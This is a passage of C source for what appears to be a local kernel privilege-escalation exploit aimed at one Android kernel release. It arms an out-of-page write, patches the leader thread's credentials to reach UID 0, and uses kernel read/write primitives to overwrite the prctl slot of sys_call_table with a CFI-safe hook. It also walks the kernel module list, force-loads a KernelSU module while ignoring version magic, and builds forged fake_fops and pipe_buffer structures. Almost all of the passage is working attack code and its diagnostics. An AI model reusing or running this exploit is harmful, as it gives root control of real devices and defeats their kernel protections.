		usleep(300 * 1000);   /* copy landing window */
		LOGI("R%d [main] deliver-only: stamp_sent + 300ms — skipping consume "
		     "(no consumer thread; readback by main)", round);
		{
			long sm_ret = __atomic_load_n(&g_sm_ret, __ATOMIC_ACQUIRE);
			if (sm_ret != 0)
				LOGI("R%d [main] BLOCK-ANOMALY (deliver): victim sendmsg "
				     "already returned ret=%ld before drain", round, sm_ret);
			else
				LOGI("R%d [main] victim sendmsg still blocking (deliver form)",
				     round);
		}
		t37_readback_selfcheck();
	}

	/* r20 (KE19 lesson: r19b child _exit'd while consumer was mid-scan,
	 * leaving the misc window open system-wide): in root mode the chain
	 * must COMPLETE before drain (35 §4.5 order: [11a] -> open -> root
	 * -> teardown -> drain). Join the consumer first. */
	if (g_mode_root) {
		LOGI("R%d [main] waiting for root chain completion (consumer join)",
		     round);
		pthread_join(g_consumer_th, NULL);
		LOGI("R%d [main] root chain done — drain may proceed", round);
		/* r28: THE ROOT PROOF on the LEADER thread (this context): the
		 * chain patched the leader's cred; getuid here = kernel's
		 * authoritative answer. */
		{
			uid_t u = getuid(), e = geteuid();
			gid_t g = getgid(), eg = getegid();
			LOGI("R%d [main] getuid=%u geteuid=%u getgid=%u getegid=%u "
			     "<<<< ROOT PROOF on leader (expect 0/0/0/0)",
			     round, u, e, g, eg);
			if (u == 0)
				LOGI("R%d [main] === UID 0 ACHIEVED (runtime "
				     "exploit, no BL unlock, no partition write) "
				     "===", round);
			else
				LOGI("R%d [main] uid != 0 — chain incomplete",
				     round);
		}
		/* 38-r58: PSTORE FORENSICS FIRST (now that we are root).
		 * r57c (boot Y) died ~600ms after the CFI module's finit
		 * returned 0 with table[167] already hooked by module init —
		 * the panic hit the litmus prctl through the hook. boot Y's
		 * console-ramoops is still sitting in /sys/fs/pstore on THIS
		 * boot (only the NEXT panic overwrites it). Pull the CFI
		 * failure line NOW, before anything else can panic. */
		{
			static const char *ps[] = {
				"/sys/fs/pstore/console-ramoops-0",
				"/sys/fs/pstore/console-ramoops",
				NULL,
			};
			int pi;

			for (pi = 0; ps[pi]; pi++) {
				FILE *pf = fopen(ps[pi], "r");
				char ln[512];
				int n = 0;

				if (!pf) {
					LOGI("R%d [pstore] open %s FAIL errno=%d",
					     round, ps[pi], errno);
					continue;
				}
				int in_trace = 0;

				while (fgets(ln, sizeof(ln), pf)) {
					n++;
					if (strstr(ln, "Internal error") ||
					    strstr(ln, "CFI failure") ||
					    strstr(ln, "Unable to handle") ||
					    strstr(ln, "pc :") ||
					    strstr(ln, "lr :") ||
					    strstr(ln, "Call trace"))
						in_trace = 1;
					if (in_trace) {
						ln[strcspn(ln, "\n")] = 0;
						LOGI("R%d [pstore] %s",
						     round, ln);
						/* blank line or "Kernel
						 * Offset" ends the block */
						if (strstr(ln, "Kernel "
								"Offset") ||
						    ln[strspn(ln, " \t")] ==
						    '\0')
							in_trace = 0;
					}
				}
				fclose(pf);
				LOGI("R%d [pstore] scanned %s (%d lines)",
				     round, ps[pi], n);
				break;
			}
		}
		/* 38-r59: PHYSRW ladder (design research/38-physrw-design.md,
		 * HITL'd 2026-09-18). Zero-plant steady-state read/write over
		 * the linear map — the load path for everything that follows
		 * (insmod pre-stage, cred, and any future table writes). */
		if (g_mode_physrw)
			t37_physrw_round();
		/* 38-r29: KernelSU module load on the ROOT leader (this
		 * context). 38-r43: SPLIT DIAGNOSTICS — r42 still returned
		 * ENOEXEC with a vermagic-fixed .ko and ZERO kernel pr_err
		 * lines in dmesg, so this round probes WHERE the failure
		 * lives: (a) flags=0 lets the REAL vermagic strcmp run — its
		 * errno (ENOEXEC with the pr_err line vs something else)
		 * bisects check_modinfo vs a deeper silent path; (b) init_
		 * module (syscall 269, memory image) as an alternative
		 * entry; (c) the kernel's own vermagic string is READ OUT
		 * of the kernel image via the still-open configfs primitive
		 * (module.c's `vermagic[]` is right next to module_kset in
		 * .rodata — we find it by scanning backwards from the
		 * linked-time address of same_magic's strcmp argument…
		 * simpler: scan the kernel text region we already know from
		 * the slide for the exact running release string). */
		if (g_mode_ksu) {
			int kfd = open("/data/local/tmp/kernelsu.ko", O_RDONLY);
			long ret;
			uint32_t kver = 0;
			FILE *pm;

			if (kfd < 0) {
				LOGI("R%d [ksu] open kernelsu.ko FAIL errno=%d",
				     round, errno);
			} else {
				/* 38-r46: DIRECT TABLE FORENSICS. The module
				 * init is log-silent (hello experiment: even
				 * pr_alert is swallowed — platform-level
				 * module printk filtering), so the only
				 * truth is the table itself. Read
				 * sys_call_table[167] (prctl) BEFORE and
				 * AFTER the kernelsu finit: if the hook is
				 * installed, the slot changes from
				 * sys_prctl.cfi_jt to ksu_sys_prctl (module
				 * text). The offline slot value is baked
				 * into the header (0xffffff8009420468) —
				 * readback = offline + slide. */
				{
					uint64_t t_slot = 0;

					t_slot = t37_kread64(g_root_fd,
						gl36_rt_slide +
						0xffffff8009a35000ULL + 167ULL * 8);
					LOGI("R%d [ksu] table[167] BEFORE = %s "
					     "(expect cfi_jt %s)", round,
					     u64hex(t_slot),
					     u64hex(0xffffff8009420468ULL +
						    gl36_rt_slide));
				}
				/* 38-r45: print-side CONTROL EXPERIMENT.
				 * r44 loaded kernelsu (Live) but produced ZERO
				 * KernelSU: log lines while every init path
				 * has pr_err/pr_info — a 3-line hello module
				 * (pr_alert + pr_info, device-true vermagic)
				 * settles whether the kernel prints module
				 * logs AT ALL on this boot. Loaded via finit
				 * flags=0 as root, in-process. */
				{
					int hfd = open(
						"/data/local/tmp/hello.ko",
						O_RDONLY);
					long hret;

					errno = 0;
					hret = syscall(273, hfd, "", 0);
					LOGI("R%d [ksu] hello finit ret=%ld "
					     "errno=%d (%s)", round, hret,
					     errno, errno_name(errno));
					if (hfd >= 0)
						close(hfd);
					usleep(100 * 1000);
				}
				/* 38-r43 (a): flags=0 — the REAL vermagic
				 * strcmp runs. ENOEXEC + a "version magic"
				 * pr_err line in dmesg = vermagic value
				 * still differs (read the truth from dmesg).
				 * ENOEXEC WITHOUT the line = failure deeper
				 * in (layout/other), vermagic innocent. */
				errno = 0;
				ret = syscall(273 /* finit_module */, kfd,
					      "", 0);
				{
					/* 38-r51: capture errno IMMEDIATELY —
					 * the AFTER readback's kread clobbers
					 * it (r50: the EEXIST branch never
					 * fired because errno had been
					 * overwritten by t37_kread64). */
					int saved_errno = errno;

					LOGI("R%d [ksu] finit flags=0 ret=%ld "
					     "errno=%d (%s) saved=%d", round,
					     ret, errno, errno_name(errno),
					     saved_errno);
					{
						uint64_t t_slot = 0;

						t_slot = t37_kread64(
							g_root_fd,
							gl36_rt_slide +
							0xffffff8009a35000ULL +
							167ULL * 8);
						LOGI("R%d [ksu] table[167] AFTER = %s "
						     "(hooked if != cfi_jt %s)",
						     round, u64hex(t_slot),
						     u64hex(0xffffff8009420468ULL +
							    gl36_rt_slide));
					}
					if (ret == 0 || saved_errno == 17)
						goto ksu_repair;
				}
				/* 38-r49..r51: fall through to the other
				 * finit attempts only when flags=0 did NOT
				 * succeed and was NOT EEXIST. */
				{
					ksu_repair:
					/* 38-r47/r48: the module's own vmap
					 * write is a no-op (table[167]
					 * unchanged after finit, r46), so
					 * WE install the prctl hook with
					 * the already-proven configfs
					 * kwrite. Module base via the
					 * KERNEL MODULE LIST walk (38-r48;
					 * sysfs is dead under
					 * kptr_restrict=2). */
					{
						FILE *sf = fopen(
			"/sys/module/kernelsu/sections/.text", "r");
						unsigned long txt = 0;

						if (sf) {
							if (fscanf(sf, "%lx",
								   &txt) == 1)
								LOGI("R%d [ksu] "
								     "module .text = %s",
								     round,
								     u64hex(txt));
							else
								LOGI("R%d [ksu] "
								     "module .text "
								     "fscanf FAIL",
								     round);
							fclose(sf);
						} else {
							LOGI("R%d [ksu] module "
							     ".text fopen FAIL",
							     round);
						}
						/* 38-r48: sysfs is dead under
						 * kptr_restrict=2, so walk the
						 * KERNEL MODULE LIST instead
						 * (research/38-modules-list-
						 * head.md): head @ slide +
						 * 0xFFFFFF800A6E12D0 (4 disasm
						 * witnesses + rela self-loop),
						 * struct module: list@+8,
						 * name@+0x18, state@+0,
						 * core_layout.base@+0x180. */
						{
							uint64_t head =
								gl36_rt_slide +
								0xFFFFFF800A6E12D0ULL;
							uint64_t entry =
								t37_kread64(
									g_root_fd,
									head);
							uint64_t mod = 0;
							int hops;

							LOGI("R%d [ksu] modules "
							     "head @ %s first=%s",
							     round, u64hex(head),
							     u64hex(entry));
							for (hops = 0;
							     hops < 120 &&
							     entry &&
							     entry != head;
							     hops++) {
								uint64_t nm,
									st;

								mod = entry - 8;
								st = t37_kread64(
									g_root_fd,
									mod);
								if ((st & ~7ULL) !=
								    0 ||
								    (st >> 60) <
									    0xF)
									break;
								nm = t37_kread64(
									g_root_fd,
									mod +
										0x18);
								LOGI("R%d [ksu] mod "
								     "hop %d @ %s "
								     "state=%llu "
								     "name8=%s",
								     round, hops,
								     u64hex(mod),
								     (unsigned long long)(st & 0x1f),
								     (char *)&nm);
								if (nm ==
								    0x75736C656E72656BULL)
									break;
								entry = t37_kread64(
									g_root_fd,
									entry);
								mod = 0;
							}
							if (mod &&
							    entry != head) {
								uint64_t base =
									t37_kread64(
									g_root_fd,
									mod +
									0x180);
								LOGI("R%d [ksu] "
								     "kernelsu FOUND "
								     "@ %s core_"
								     "layout.base=%s",
								     round,
								     u64hex(mod),
								     u64hex(base));
								if ((base >> 48) ==
								    0xFFFF) {
									/* 38-r52: CFI-safe
									 * hook install.
									 * Writing
									 * the bare module address
									 * into table[167] panics on
									 * the FIRST prctl (CFI
									 * jt-window check, r51 KE).
									 * 38-r56: CFI-REBUILT module
									 * (MiCode LTO_CLANG tree) —
									 * write the module's OWN
									 * jump-table entry
									 * ksu_sys_prctl.cfi_jt
									 * (ko +0xa0d8, a single `b`
									 * to ksu_sys_prctl) into
									 * table[167]: same shape as
									 * the device's in-image
									 * sys_prctl.cfi_jt (verified
									 * byte-identical in
									 * kernel-Image.bin), so the
									 * CFI jt-window check sees
									 * a well-formed jt entry.
									 * NO .text writes (r55 KE:
									 * image/physmap pages RO). */
						/* hook_va computed in the
						 * r57 conditional block
						 * below. */
						uint64_t hook_va;

						/* 38-r57: CONDITIONAL hook
						 * install. r56 discovery: the
						 * CFI module's own init DOES
						 * install the hook (vmap
						 * write_ro works for the CFI
						 * build) — table[167] was
						 * already ksu_sys_prctl.cfi_jt
						 * @ base+0xb0d8 (= ko
						 * .text+0x70d8; module .text
						 * lands at base+0x4000) BEFORE
						 * we touched anything. r56's
						 * probe OVERWROTE that good
						 * value with base+0xa0d8 (stale
						 * file offset pointing into
						 * module .text middle) -> CFI
						 * panic. New rule: read first;
						 * if the slot != sys_prctl.cfi_jt
						 * (slide-baked) the module
						 * already hooked — DO NOT
						 * write, go straight to
						 * litmus. Only write
						 * base+0xb0d8 (runtime jt)
						 * when the slot is pristine. */
						{
							uint64_t slot_va =
								gl36_rt_slide +
								0xffffff8009a35000ULL +
								167ULL * 8;
							uint64_t cur = 0;
							uint64_t cfi_jt =
								gl36_rt_slide +
								0xffffff8009420468ULL;

							if (t37_kread_data(g_root_fd, slot_va, &cur, 8) != 8)
								goto ksu_loaded;
							hook_va = base + 0xb0d8;
							if (cur != cfi_jt) {
								LOGI("R%d [ksu] table[167]=%s already HOOKED by module init (expect jt %s, got %s = base+0x%llx) — no write, litmus next",
								     round,
								     u64hex(cur),
								     u64hex(cfi_jt),
								     u64hex(hook_va),
								     (unsigned long long)(cur - base));
							} else {
								LOGI("R%d [ksu] table[167] pristine cfi_jt — writing runtime jt hook %s (base %s + 0xb0d8)",
								     round,
								     u64hex(hook_va),
								     u64hex(base));
								if (t37_kwrite_data(g_root_fd, slot_va, &hook_va, 8) == 8)
									LOGI("R%d [ksu] table[167] kwrite LANDED", round);
								cur = 0;
								t37_kread_data(g_root_fd, slot_va, &cur, 8);
								LOGI("R%d [ksu] table[167] AFTER = %s (hooked if == %s)",
								     round, u64hex(cur),
								     u64hex(hook_va));
							}
						}
						/* 3: the ABI litmus — the NEXT
									 * prctl in THIS process must
									 * return 11872 (or the panic
									 * happens here, which is
									 * equally diagnostic). */
									{
										uint32_t kv = 0;
										long pr = syscall(
											SYS_prctl,
											0xDEADBEEFULL,
											2ULL, &kv, 0ULL,
											0ULL);
										LOGI("R%d [ksu] prctl "
										     "GET_VERSION ret=%ld "
										     "version=%u (expect "
										     ">0) <<<< ABI LITMUS",
										     round, pr, kv);
									}
									goto ksu_loaded;
								} else {
									LOGI("R%d [ksu] "
									     "core_layout.base "
									     "not a kernel "
									     "VA (%s) — abort "
									     "hook write",
									     round,
									     u64hex(base));
								}
							} else {
								LOGI("R%d [ksu] "
								     "kernelsu NOT found "
								     "in module list "
								     "(hops=%d)",
								     round, hops);
							}
						}
						if (txt) {
							/* 38-r56: dead path under
							 * kptr_restrict=2 (txt=0);
							 * kept CFI-consistent: jt
							 * offset, not bare fn. */
							uint64_t hook_va =
								txt + 0xa0d8;
							uint64_t slot_va =
								gl36_rt_slide +
								0xffffff8009a35000ULL +
								167ULL * 8;
							uint64_t chk = 0;

							LOGI("R%d [ksu] writing "
							     "hook %s -> table "
							     "[167] @ %s", round,
							     u64hex(hook_va),
							     u64hex(slot_va));
							if (t37_kwrite_data(
								    g_root_fd,
								    slot_va,
								    &hook_va,
								    8) == 8)
								LOGI("R%d [ksu] "
								     "hook write "
								     "LANDED",
								     round);
							chk = t37_kread64(
								g_root_fd,
								slot_va);
							LOGI("R%d [ksu] table "
							     "[167] NOW = %s "
							     "(hooked if %s)",
							     round, u64hex(chk),
							     u64hex(hook_va));
						}
					}
					goto ksu_loaded;
				}
				/* (b) IGNORE_VERMAGIC only (flags=2) */
				errno = 0;
				ret = syscall(273, kfd, "", 2);
				LOGI("R%d [ksu] finit flags=2 ret=%ld errno=%d "
				     "(%s)", round, ret, errno,
				     errno_name(errno));
				if (ret == 0)
					goto ksu_loaded;
				/* (c) full IGNORE (flags=3, r40/r42 form) */
				errno = 0;
				ret = syscall(273, kfd, "", 3);
				LOGI("R%d [ksu] finit flags=3 ret=%ld errno=%d "
				     "(%s)", round, ret, errno,
				     errno_name(errno));
				if (ret == 0)
					goto ksu_loaded;
				/* (d) legacy init_module from a private
				 * memory image (syscall 269) — different
				 * front door, same backend load_module. */
				{
					size_t sz = (size_t)lseek(kfd, 0,
								 SEEK_END);
					void *buf;

					lseek(kfd, 0, SEEK_SET);
					buf = malloc(sz);
					if (buf && read(kfd, buf, sz) ==
					    (ssize_t)sz) {
						errno = 0;
						ret = syscall(269 /* init_
								    module */,
							      buf, (unsigned long)sz,
							      "");
						LOGI("R%d [ksu] init_module "
						     "ret=%ld errno=%d (%s) "
						     "(len=%zu)", round, ret,
						     errno, errno_name(errno),
						     sz);
					} else {
						LOGI("R%d [ksu] init_module "
						     "read FAIL (len=%zu)",
						     round, sz);
					}
					free(buf);
				}
ksu_loaded:
				close(kfd);
				usleep(200 * 1000);   /* hook init settles */
				pm = fopen("/proc/modules", "r");
				if (pm) {
					char ln[256];
					int found = 0;

					while (fgets(ln, sizeof(ln), pm))
						if (!strncmp(ln, "kernelsu", 8))
							found = 1;
					fclose(pm);
					LOGI("R%d [ksu] /proc/modules %s",
					     round, found ? "HAS kernelsu" :
					     "WITHOUT kernelsu");
				}
				/* ABI check: prctl(0xDEADBEEF,
				 * CMD_GET_VERSION=2, &ver) → 11872 */
				errno = 0;
				kver = 0;
				ret = syscall(SYS_prctl, 0xDEADBEEFULL, 2ULL,
					      &kver, 0ULL, 0ULL);
				LOGI("R%d [ksu] prctl GET_VERSION ret=%ld "
				     "errno=%d version=%u (expect >0)",
				     round, ret, errno, kver);
				{
					int dm = open("/dev/kmsg", O_RDONLY |
						      O_NONBLOCK);
					char line[192];
					int kcnt = 0;

					if (dm >= 0) {
						char dump[4096];
						ssize_t n, total = 0;

						while ((n = read(dm, line,
								sizeof(line))) > 0 &&
						       total < (ssize_t)sizeof(dump) - n) {
							memcpy(dump + total, line, n);
							total += n;
						}
						close(dm);
						/* 打尾部含 ksu 的行 */
						{
							ssize_t p = total;
							while (p > 0) {
								ssize_t s = p - 1;
								while (s > 0 && dump[s-1] != '\n')
									s--;
								dump[p > 1 && dump[p-1] == '\n' ? p-1 : p] = 0;
								if (total - s > 4) {
									char *c = dump + s;
									if (strstr(c, "ksu") ||
									    strstr(c, "KernelSU") ||
									    strstr(c, "kernelsu"))
									LOGI("R%d [ksu] kmsg: %s",
									     round, c);
									if (++kcnt > 12)
										break;
								}
								p = s;
							}
						}
					}
				}
			}
		}
	}

	/* drain: wake victim's sendmsg; ret == payload bytes = byte-level
	 * name-match proof (bind/sendmsg same 48B buffer, full-len memcmp) */
	t37_drain_queue();
	{
		int waited = 0;
		while (!__atomic_load_n(&stamp_ready, __ATOMIC_ACQUIRE) && waited < 5000) {
			usleep(20 * 1000);
			waited += 20;
		}
		{
			long sm_ret = __atomic_load_n(&g_sm_ret, __ATOMIC_ACQUIRE);
			int sm_errno = __atomic_load_n(&g_sm_errno, __ATOMIC_ACQUIRE);
			LOGI("R%d [t37] victim sendmsg ret=%ld errno=%d(%s) "
			     "(expect ret=%d — blocking carrier self-check)",
			     round, sm_ret, sm_errno, errno_name(sm_errno), SM2_PAYLOAD);
			if (sm_ret != SM2_PAYLOAD)
				LOGI("R%d [t37] CARRIER-ANOMALY: ret=%ld != %d — carrier "
				     "geometry/name anomaly, take full log back", round,
				     sm_ret, SM2_PAYLOAD);
		}
	}
	if (g_mode_deliver_only)
		LOGI("R%d [t37] DELIVER-ONLY ROUND COMPLETE — four-slot delivery + "
		     "readback evidence; consume deferred (canary geometry unresolved)",
		     round);
	else
		LOGI("R%d [t37] DRYRUN ROUND COMPLETE — four-slot delivery + chain-walk "
		     "canary (ret=0 + no KE = [11a] off-page write skipped, §2 argued)",
		     round);

	if (write(g_done_fd, "x", 1) != 1)
		LOGI("R%d: pipe write 'x' failed", round);
	for (;;)
		pause();
	return 0;
}

/* 39-r108 offline vote test: feed a perf data file (byte-wise sliding
 * window, same as pin_slide_median.py load_ips) through the REAL median
 * vote; host smoke compares against the py output. Skips the uname gate —
 * pure table math, no kernel touched. */
static int t37_voteonly_main(const char *path)
{
	static struct kv ip_h[65537];
	int n_starts, n_ips = 0;
	uint64_t s, v;
	long sz;
	uint8_t *d;
	FILE *f = fopen(path, "rb");

	n_starts = t37_sym_decode(t37_starts, t37_sym_buf_b, T37_SYM_MAX);
	if (n_starts <= 0) {
		LOGI("[t37] voteonly: starts table decode FAIL");
		return -1;
	}
	if (!f) {
		LOGI("[t37] voteonly: open %s FAIL (errno=%d)", path, errno);
		return -1;
	}
	fseek(f, 0, SEEK_END);
	sz = ftell(f);
	fseek(f, 0, SEEK_SET);
	d = malloc(sz ? sz : 1);
	if (!d || fread(d, 1, sz, f) != (size_t)sz) {
		LOGI("[t37] voteonly: read %s FAIL", path);
		fclose(f);
		free(d);
		return -1;
	}
	fclose(f);
	memset(ip_h, 0, sizeof(ip_h));
	for (long off = 0; off + 8 <= sz; off++) {
		memcpy(&v, d + off, 8);
		if ((v >> 40) != 0xffffffULL)
			continue;
		uint64_t i = (v >> 7) % 65537;

		while (ip_h[i].cnt && ip_h[i].key != v)
			i = (i + 1) % 65537;
		if (!ip_h[i].cnt) {
			ip_h[i].key = v;
			n_ips++;
		}
		ip_h[i].cnt++;
	}
	free(d);
	LOGI("[t37] voteonly: %d distinct kernel IPs from %s", n_ips, path);
	if (t37_median_vote(ip_h, n_starts, &s) != 0)
		return -1;
	LOGI("[t37] voteonly pinned = %s", u64hex(s));
	return 0;
}

int main(int argc, char **argv)
{
	const char *mode;
	int rounds, round, ok_rounds = 0;
	struct utsname un;

	if (uname(&un) == 0)
		LOGI("kernel %s %s", un.sysname, un.release);
	/* 38-r30: journal everything to a device-side file — adb pipes die
	 * with KE panics and the judgment lines are the evidence.
	 * 38-r35: save the adb pipe FIRST (freopen consumes fd 2); LOGI
	 * dual-writes to it so panic-time evidence survives on the host. */
	g_adbd_fd = dup(2);
	{
		FILE *jr = fopen("/data/local/tmp/t37-last.log", "w");
		if (jr) {
			fclose(jr);
			if (!freopen("/data/local/tmp/t37-last.log", "a", stderr))
				LOGI("[t37] WARN: journal reopen FAIL (errno=%d)",
				     errno);
		}
	}

	mode = (argc > 1) ? argv[1] : "dryrun";
	if (strcmp(mode, "voteonly") == 0) {
		if (argc < 3) {
			LOGI("usage: t37_dryrun voteonly <perf.data>");
			return 2;
		}
		return t37_voteonly_main(argv[2]);
	}

	/* 39-r108 oneclick gate: the embedded starts table is version-specific
	 * — refuse to run on any other release (handoff §3, step 1) */
	if (uname(&un) != 0 ||
	    strcmp(un.release, "4.14.186-perf-00243-g9a0d96109bda") != 0) {
		LOGI("[t37] FATAL: release mismatch (got '%s', need '4.14.186-perf-00243-g9a0d96109bda')",
		     uname(&un) == 0 ? un.release : "uname-fail");
		return 3;
	}
	if (strcmp(mode, "dryrun") == 0) {
		g_mode_deliver_only = 0;
	} else if (strcmp(mode, "deliver") == 0) {
		g_mode_deliver_only = 1;
	} else if (strcmp(mode, "ksu") == 0) {
		/* 38-r29: root chain + KernelSU module load */
		g_mode_deliver_only = 0;
		g_mode_root = 1;
		g_mode_ksu = 1;
	} else if (strcmp(mode, "physrw") == 0) {
		/* 38-r59: root chain + forged pipe_buffer ladder (P0-P3) */
		g_mode_deliver_only = 0;
		g_mode_root = 1;
		g_mode_physrw = 1;
	} else if (strcmp(mode, "root") == 0) {
		/* 37-r17: Tier-3 write round. Single-shot by discipline: arms
		 * the [11a] off-page write and runs the privilege chain inside
		 * the consumer thread right after the walk returns. */
		g_mode_deliver_only = 0;
		g_mode_root = 1;
	} else if (strcmp(mode, "pagecheck") == 0) {
		/* oracle-only mode: pin slide + page base, print, exit */
		DIE_IF(t37_marker_page_setup() != 0, "marker page");
		if (t37_pin_slide() != 0 && t37_pin_slide() != 0)
			DIE_IF(1, "slide pin");
		DIE_IF(t37_pin_page_base() != 0, "page base pin");
		LOGI("[t37] pagecheck: slide=%s page_base=%s (oracle re-acquired)",
		     u64hex(g_slide), u64hex(g_page_base));
		if (g_page_map) { munlock(g_page_map, 4096); munmap(g_page_map, 4096); }
		if (g_page_fd >= 0) close(g_page_fd);
		return 0;
	} else {
		LOGI("usage: t37_dryrun [dryrun|deliver|root|ksu|physrw|pagecheck] [rounds]");
		return 2;
	}
	rounds = (argc > 2) ? atoi(argv[2]) : 3;
	/* 37-r5 fix (16MB vote ambiguity): slide may be forced from the host
	 * (offline histogram match, 31-proven method) as argv[3] hex; the
	 * in-probe tiny-symbol vote mis-pinned by 8 slots (16MB) on the r4
	 * boot and poisoned every text anchor on the pseudo page. */
	if (argc > 3) {
		g_slide_forced = strtoull(argv[3], NULL, 16);
		LOGI("[t37] slide FORCED from host: %s", u64hex(g_slide_forced));
	}

	/* boot-anchoring: record uptime at start (same-boot monotonic check) */
	{
		FILE *f = fopen("/proc/uptime", "r");
		if (f) {
			char ub[128];
			if (fgets(ub, sizeof(ub), f))
				LOGI("[t37] boot anchor: uptime=%s", ub);
			fclose(f);
		}
	}

	LOGI("=== t37 Tier-2 poison dry-run: mode=%s rounds=%d ===", mode, rounds);
	if (g_mode_root)
		LOGI("=== t37 Tier-3 WRITE ROUND: mode=root rounds=%d (HITL 2026-09-16 "
		     "'全按推荐':ashmem misc 主行/单发/失败即停) ===", rounds);
	LOGI("%s", g_mode_root ?
	     "[t37] WRITE claim: [11a] armed (rb_right=TARGET) — writes = [TARGET]=fake_fops "
	     "(hijack) + [fake_fops+0x08]=TARGET (in-page llseek slot, self-healing) + "
	     "post-open chain (cred/security/seccomp patch via configfs primitive) + "
	     "teardown ([victim+0x880]=0, misc restore pre-root, drain)" :
	     "[t37] zero-write claim: chain reaches [12]/out_put_task; writes = "
	     "victim stack + marker page (user-controlled) + scheduler "
	     "bookkeeping (locks transient / rq->clock / refcount net-zero); "
	     "[11a] off-page write eliminated by W0.pi {pc=fake_fops (RED bit0=0), rb_right=0}");

	DIE_IF(t37_marker_page_setup() != 0, "marker page");
	if (t37_pin_slide() != 0 && t37_pin_slide() != 0)
		DIE_IF(1, "slide pin");
	DIE_IF(t37_pin_page_base() != 0, "page base pin");

	/* pseudo-world fill AFTER pin (37-r3): anchors now use the real
	 * page_base; write through the MAP_SHARED mapping so the kernel page
	 * is updated in place (same physical page the oracle just pinned).
	 * 37-r16: the fill+verify moved into t37_rearm_pseudo_world() so it
	 * re-runs before EVERY round (KE12 fix). */
	t37_rearm_pseudo_world();

	LOGI("[t37] anchors: slide=%s page_base=%s fake_lock=%s W0=%s "
	     "fake_task=%s fake_fops=%s",
	     u64hex(g_slide), u64hex(g_page_base), u64hex(g_fake_lock),
	     u64hex(g_w0), u64hex(g_fake_task), u64hex(g_fake_fops));

	for (round = 1; round <= rounds; round++) {
		int pfd[2];
		pid_t pid;
		char c;
		fd_set set;
		struct timeval tv;
		int died = 0;

		DIE_IF(pipe(pfd) != 0, "pipe");
		pid = fork();
		DIE_IF(pid < 0, "fork");
		if (pid == 0) {
			close(pfd[0]);
			g_done_fd = pfd[1];
			_exit(run_child(round));
		}
		close(pfd[1]);

		FD_ZERO(&set);
		FD_SET(pfd[0], &set);
		tv.tv_sec = 30;
		tv.tv_usec = 0;
		if (select(pfd[0] + 1, &set, NULL, NULL, &tv) > 0) {
			ssize_t rd = read(pfd[0], &c, 1);
			if (rd != 1) {
				LOGI("R%d: CHILD EXITED EARLY (EOF — see ERR lines above)", round);
				died = 1;
			}
		} else {
			LOGI("R%d: TIMEOUT waiting for formation (child hung?)", round);
			died = 1;
		}

		if (!died) {
			FD_ZERO(&set);
			FD_SET(pfd[0], &set);
			tv.tv_sec = 60;
			tv.tv_usec = 0;
			if (select(pfd[0] + 1, &set, NULL, NULL, &tv) > 0) {
				ssize_t rd = read(pfd[0], &c, 1);
				if (rd == 1) {
					ok_rounds++;
					LOGI("R%d: ROUND OK (consumed/delivered, no unexpected death) "
					     "[ok=%d/%d]", round, ok_rounds, round);
				} else {
					LOGI("R%d: CHILD EXITED BEFORE COMPLETE (EOF — non-destructive "
					     "fail round)", round);
				}
			} else {
				LOGI("R%d: TIMEOUT waiting for completion (crash = expected only "
				     "if canary geometry failed)", round);
			}
		}
		syscall(SYS_kill, pid, 9);
		waitpid(pid, NULL, 0);
		close(pfd[0]);
		usleep(50000);
	}

	{
		FILE *f = fopen("/proc/uptime", "r");
		if (f) {
			char ub[128];
			if (fgets(ub, sizeof(ub), f))
				LOGI("[t37] boot anchor end: uptime=%s (must be monotonic > start)",
				     ub);
			fclose(f);
		}
	}

	LOGI("=== t37 %s phase done: %d/%d rounds completed ===", mode, ok_rounds, rounds);
	if (ok_rounds == rounds && rounds > 0)
		LOGI("[t37] verdict input: all rounds OK — check per-round lines: "
		     "blocking precondition / readback 176B OK / prio=3 != real 120 / "
		     "sched_setattr ret=0 / getpriority-after=20 / scheduler=3 / "
		     "CARRIER ret=%d / device alive (no new AEE db)", SM2_PAYLOAD);
	else
		LOGI("[t37] verdict input: incomplete rounds — take per-round ANOMALY "
		     "lines to attribution");
	/* 41-r127: full pstore dump while still root — panic forensics need
	 * the PREVIOUS panic's console text; the file survives reboot until
	 * the next panic overwrites it, and the next probe run reads it back
	 * before anything else. Best-effort. */
	{
		int pf = open("/sys/fs/pstore/console-ramoops", O_RDONLY);

		if (pf >= 0) {
			int of = open("/data/local/tmp/pstore_dump.txt",
				      O_WRONLY | O_CREAT | O_TRUNC, 0644);
			char pbuf[8192];
			ssize_t r;
			long total = 0;

			if (of >= 0) {
				while ((r = read(pf, pbuf, sizeof(pbuf))) > 0) {
					ssize_t w = write(of, pbuf, r);

					if (w != r)
						break;
					total += w;
				}
				close(of);
				LOGI("[t37] pstore FULL dump -> /data/local/tmp/"
				     "pstore_dump.txt (%ld bytes)", total);
			} else {
				LOGI("[t37] pstore dump open-out FAIL errno=%d",
				     errno);
			}
			close(pf);
		} else {
			LOGI("[t37] pstore console-ramoops open FAIL errno=%d "
			     "(no ramoops this boot)", errno);
		}
	}
	if (g_page_map) { munlock(g_page_map, 4096); munmap(g_page_map, 4096); }
	if (g_page_fd >= 0) close(g_page_fd);
	return 0;
}
